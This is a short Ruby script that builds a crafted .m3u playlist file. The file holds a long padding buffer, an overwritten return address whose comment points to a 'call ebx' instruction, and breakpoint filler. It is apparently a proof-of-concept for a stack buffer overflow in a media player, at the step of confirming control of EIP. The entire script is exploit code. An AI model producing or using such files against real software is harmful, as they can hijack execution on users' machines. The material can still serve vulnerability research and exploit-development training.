#!/usr/bin/env ruby

file = "findeipcontrol.m3u"

junk = "\x41" * 35058
eip = "\x28\x72\xAB\x01" # Memory Adress 01AB7228   #OP code for call ebx FFD3
junk2 = "\xcc" * (60000 - (junk + eip).size)
exploit = junk + eip + junk2

File.open(file, 'w') {|s| s.write(exploit)}
puts "File #{file} was created"